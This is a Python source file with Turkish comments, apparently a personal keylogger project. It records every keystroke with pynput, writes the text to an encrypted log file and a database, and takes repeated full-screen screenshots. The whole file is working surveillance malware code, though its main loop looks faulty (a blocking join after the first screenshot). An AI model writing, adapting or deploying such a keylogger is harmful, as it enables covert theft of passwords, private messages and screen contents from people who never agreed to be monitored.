import os
import time
from datetime import datetime
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from cryptography.fernet import Fernet
from key_manager import load_key
from database import insert_log, insert_screenshot

# Log dosyasının yolu
log_dir = os.path.expanduser('~') + "/PycharmProjects/pythonProject/keylogger/"
log_file = log_dir + "log.txt"
keys = []

# Klavye tuşlarını kaydetme
def on_press(key):
    keys.append(key)
    if len(keys) >= 10:  # 10 tuş basımından sonra kaydet
        write_file(keys)
        keys.clear()

# Tuş basımlarını dosyaya yazma
def write_file(keys):
    key = load_key()
    f = Fernet(key)
    log_content = ''
    for key in keys:
        k = str(key).replace("'", "")
        if k.find("space") > 0:
            log_content += ' '
        elif k.find("enter") > 0:
            log_content += '\n'
        elif k.find("Key") == -1:
            log_content += k
    log_content += f' [{datetime.now()}]\n'
    # Log dosyasına yazma
    with open(log_file, "ab") as file:
        file.write(f.encrypt(log_content.encode('utf-8')))
    # Veritabanına ekleme
    insert_log(log_content)

# Ekran görüntüsü alma ve kaydetme
def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_path = f'screenshot_{int(time.time())}.png'
    screenshot.save(screenshot_path)
    # Veritabanına ekran görüntüsü yolunu ekleme
    insert_screenshot(screenshot_path)

# Zamanlanmış görevler
def job():
    take_screenshot()

# Dinleyici fonksiyonları
with Listener(on_press=on_press) as listener:
    while True:
        job()
        time.sleep(1)
        listener.join()